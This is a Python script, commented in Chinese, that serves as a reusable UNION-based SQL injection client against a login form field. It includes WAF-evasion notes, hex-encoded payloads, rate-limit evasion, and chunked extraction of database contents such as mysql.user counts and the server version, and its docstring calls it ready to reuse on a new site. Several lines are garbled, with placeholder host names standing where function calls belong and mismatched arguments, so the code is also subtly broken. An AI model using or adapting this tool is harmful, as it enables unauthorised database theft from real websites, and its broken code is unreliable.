#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""rrq2.py — SCLUB 注入点客户端（★ 三个根因已固化，换站直接可用）

★★★ 三个根因（都在这个注入点上踩过，每个浪费 20+ 分钟）★★★
① 回显文案是【繁体「歡迎」】，用简体「欢迎」的正则会静默返回 None
   ⇒ 现象：语句明明没问题，客户端却返回 None，看起来像"被 WAF 拦"
② hex 会【从左截断】，只保留尾部若干位
   ⇒ 字面量（SELECT 0x4142…）不截；计算/聚合结果（COUNT(*)、GROUP_CONCAT）截
   ⇒ 解法：RIGHT(值, N) 包一层。实测 COUNT(*) FROM mysql.user 直读只剩 1 位乱码，
           RIGHT(COUNT(*),8) 得到完整 '59532'
③ 必须写成 (SELECT … FROM 表)，裸 EXPR FROM 表返回 21996 字节错误页

★ 回显无字节上限（实测 20 字节逐字节校验全对）。「58 字节上限」是根因①的假象。

★ 语句形式约束（全部实测）：
  通：(SELECT GROUP_CONCAT(col SEPARATOR 0x40) FROM t)
      (SELECT GROUP_CONCAT(col …) FROM t LIMIT n)      ← 单参 LIMIT
      (SELECT … FROM information_schema.columns WHERE table_schema=0x…)
  拦：EXPR FROM 表（不包 SELECT）
      FROM (SELECT …) t  派生表
      LIMIT 40,0 / LIMIT 0,40  双参 offset（⇒ 无法 offset 分页）
      GROUP_CONCAT(CONCAT_WS(0x7c,a,b,c))  多列拼接
      CONCAT('V=',(EXPR))  作回显前缀（⇒ 用 HEX()）

★ 其它：GROUP_CONCAT 被 group_concat_max_len=1024 截断；Python % 格式化会吃 SQL 里的
  %root% ⇒ 字符串常量一律 0x 十六进制字面量；会话级限流（带 FROM 累计到阈值被拦，
  冷却 120s 无效）⇒ 间隔 >=8s、失败不重试。
"""
import os
import re
import sys
import time

for _k in ("HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy", "ALL_PROXY"):
    os.environ.pop(_k, None)
os.environ["NO_PROXY"] = "*"
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

import requests

HOST = "example.com"            # ← 换站改这里
PATH = "/example.com"
FIELD = "NICKNAME"             # ← 注入点字段
COLS = 18                      # ← UNION 列数
PROXY = {"http": "http://127.0.0.1:7892", "https": "http://127.0.0.1:7892"}
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/203.0.113.26 Safari/537.36")
MD5_DUMMY = "9dd4e461268c8034f5c8564e155c67a6"   # md5("x")，占位第4列

# ★★ 根因①：繁体「歡迎」。写成简体会静默返回 None。
ECHO_RE = re.compile(r"歡迎\s*([0-9a-fA-F]+)")
_last = [0.0]
GAP = float(os.environ.get("RR_GAP", "8.0"))


def log(m):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), m), flush=True)


def hx(s):
    """字符串 → 0x 十六进制字面量（避开引号过滤与 Python % 格式化）"""
    return "0x" + s.encode("utf-8").hex()


def _payload(expr):
    """构造 UNION 载荷。expr 会被 HEX() 包裹 —— 这也是根因②的规避前提。"""
    nulls = ",".join(["NULL"] * (COLS - 3))
    return ("x' UNION SELECT NULL,NULL,HEX((%s)),'%s',%s-- -"
            % (expr, MD5_DUMMY, nulls))


def raw(expr, timeout=60):
    """expr 必须是完整 (SELECT … ) 形式。返回解码字符串；0行=''；失败=None"""
    dt = time.time() - _last[0]
    if dt < GAP:
        time.sleep(GAP - dt)
    _last[0] = time.time()
    data = {"PUT": "LOGON", "PASSWORD": "x", "DOMAIN": "14", FIELD: _payload(expr)}
    s = requests.Session()
    s.trust_env = False
    s.proxies = dict(PROXY)
    s.headers.update({"User-Agent": UA, "Connection": "close"})
    try:
        r = target8.example.com("http://%s%s" % (HOST, PATH), data=data, timeout=timeout,
                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                   allow_redirects=False)
        b = r.content.decode("utf-8", "replace")
        if len(b) > 20000:
            return None                        # WAF/SQL 错误页
        m = ECHO_RE.search(b)
        if not m or not target22.example.com(1):
            return ""
        h = target22.example.com(1)
        if len(h) % 2:
            return "<odd:%s>" % h
        try:
            return bytes.fromhex(h).decode("utf-8", "replace")
        except Exception:
            return "<hex:%s>" % h
    except Exception as e:
        log("   [EXC] %s" % str(e)[:100])
        return None


def q(expr, gap=None):
    """传表达式片段，自动包一层 (SELECT …) —— 根因③"""
    return raw("(SELECT %s)" % expr, gap=gap)


def right(expr, n=20):
    """★ 根因②的标准用法：RIGHT() 取尾部。计算/聚合结果一律走这个。"""
    return q("RIGHT((%s),%d)" % (expr, n))


def read_full(select_stmt, chunk=120, label=""):
    """读长结果：GROUP_CONCAT 有 max_len=1024，且 hex 左截断 ⇒ 分段 + RIGHT 保底"""
    ln = right("LENGTH((%s))" % select_stmt, 20)
    if ln is None or not ln.strip().isdigit():
        ln = q("LENGTH((%s))" % select_stmt)     # 兜底
    if ln is None or not ln.strip().isdigit():
        log("   [len?] %s 失败 (%r)" % (label, ln))
        return None
    total = int(ln.strip())
    log("   [len] %s = %d 字节" % (label, total))
    if total == 0:
        return ""
    out, pos = [], 0
    while pos < total:
        n = min(chunk, total - pos)
        seg = raw("SELECT SUBSTRING((%s),%d,%d)" % (select_stmt, pos + 1, n))
        if seg is None:
            log("   [段失败] pos=%d/%d ← 断点可续" % (pos, total))
            break
        if seg.startswith("<odd:") or seg.startswith("<hex:"):
            seg = raw("SELECT RIGHT(SUBSTRING((%s),%d,%d),%d)"
                     % (select_stmt, pos + 1, n, n))
            log("   [左截] pos=%d → RIGHT 补救" % pos)
        out.append(seg)
        pos += n
        log("   +%d/%d" % (pos, total))
    s = "".join(out)
    log("   [ok] %s = %d/%d" % (label, total))
    return s


if __name__ == "__main__":
    log("=== rrq2 自检 ===")
    log("  DATABASE()  -> %r" % q("DATABASE()"))
    log("  VERSION()   -> %r" % q("VERSION()"))
    log("  RIGHT(COUNT(*),8) FROM mysql.user -> %r" % q("RIGHT(COUNT(*),8) FROM mysql.user"))